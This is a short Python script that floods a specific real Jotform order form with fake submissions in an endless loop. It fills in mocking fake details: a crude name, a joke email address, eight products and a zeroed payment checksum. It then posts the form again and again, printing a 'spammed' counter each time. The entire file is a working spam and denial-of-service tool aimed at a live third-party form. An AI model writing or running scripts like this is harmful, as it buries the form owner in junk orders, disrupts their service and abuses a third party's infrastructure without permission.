import requests

form_data = {
    'q3_name[first]': 'get',
    'q3_name[last]': 'fukd',
    'q4_email': 'lmao@lmao.lmao',
    'simple_fpc': '11',
    'payment_transaction_uuid': '0188504199b87ec4af39316708d534378186',
    'payment_total_checksum': '0',
    'q11_myProducts[special_1000][item_0]': '1',
    'q11_myProducts[special_1001][item_0]': '1',
    'q11_myProducts[special_1002][item_0]': '1',
    'q11_myProducts[special_1003][item_0]': '1',
    'q11_myProducts[special_1004][item_0]': '1',
    'q11_myProducts[special_1005][item_0]': '1',
    'q11_myProducts[special_1006][item_0]': '1',
    'q11_myProducts[special_1007][item_0]': '1',
    'q13_lockerNumber': '6969',
    'q14_paymentMethod': 'nope',
    'q16_transactionLocation': 'never',
    'website': '',
    'simple_spc': '231424308407045-231424308407045',
    'event_id': '1684973655270_231424308407045_7oAbhO7',
    'validatedNewRequiredFieldIDs': 'No validated required fields'
}

iteration = 0
while True:
    iteration += 1
    response = requests.post('https://submit.jotform.com/submit/231424308407045', data=form_data)

    if response.status_code == 200:
        print('yayyyyy')
        print('spammed:', iteration)
    else:
        print('nayyyyy')
        print(response.status_code)
        raise Exception("you goofed")
